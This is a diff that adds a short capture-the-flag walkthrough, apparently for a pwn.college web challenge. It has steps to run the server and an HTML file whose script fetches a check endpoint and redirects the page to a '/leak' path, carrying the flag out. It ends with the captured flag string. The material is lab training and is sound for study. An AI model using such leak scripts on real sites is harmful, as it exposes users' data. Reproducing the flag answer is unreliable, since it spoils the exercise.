@@ -1,0 +1,13 @@
+Start the challenge and read the code. cat /challenge/server
+Start Terminal1 or Tab1 and start the server: /challenge/server
+Open Terminal2 (or Tab2) and create the following HTML file.
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script>
+fetch("/check?challenge_key=trmqxenl&private_key=hqclqagt&flag=neropxuy")
+  .then(r => r.text())
+  .then(flag => window.location = "/leak?" + flag);
+</script>
+EOF
+Start the server and client by opening/challenge/server and /challenge/client in two different tabs.
+The flag will show in the server tab.
+The flag is: pwn.college{0dPQj5dDLl5tsNOGc9c3jN5PwZz.QX4EDM1EDL5MjM1QzW}
